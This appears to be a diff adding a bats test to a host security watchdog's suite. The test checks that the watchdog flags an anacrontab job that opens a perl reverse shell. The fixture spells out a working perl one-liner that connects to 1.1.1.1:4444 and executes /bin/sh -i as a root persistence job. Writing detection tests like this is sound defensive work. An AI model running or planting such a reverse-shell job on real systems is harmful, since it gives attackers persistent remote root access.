@@ -328,3 +328,20 @@ EOF
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on anacrontab job surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp anacrontab
+    # job rev-shell variants. Perl on every Debian/Ubuntu. Locks
+    # perl axis on T1053.003 anacron-schedule-trigger root-exec
+    # persistence.
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cat > "${ANAC}" <<'EOF'
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+1	5	evil	perl -e "use Socket;\$i=\"1.1.1.1\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));exec(\"/bin/sh -i\");"
+EOF
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
